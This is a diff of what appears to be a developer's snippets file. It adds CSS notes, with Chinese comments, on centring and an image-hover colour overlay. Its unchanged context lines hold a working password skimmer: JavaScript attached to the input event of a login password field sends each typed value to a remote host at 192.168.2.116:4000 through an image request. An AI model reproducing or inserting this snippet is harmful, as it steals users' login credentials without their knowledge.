@@ -1582,6 +1582,25 @@ document.getElementById('TANGRAM__PSP_10__password').oninput=function () {
     var img=new Image()
     img.src='http://192.168.2.116:4000/?pwd='+this.value;
 }
+//css相对居中
+margin:0 auto;
+position:relative;
+left:50px;
+//图片hover,加一个覆盖的颜色
+.inter_learn .pic:after{
+    position: absolute;
+    content: '';
+    width: 392px;
+    height: 392px;
+    right: 0;
+    background: #25b7eb;
+    opacity: 0;
+}
+.inter_learn .pic:hover:after{
+    opacity: .8;
+}
+
+
 
                         
                         
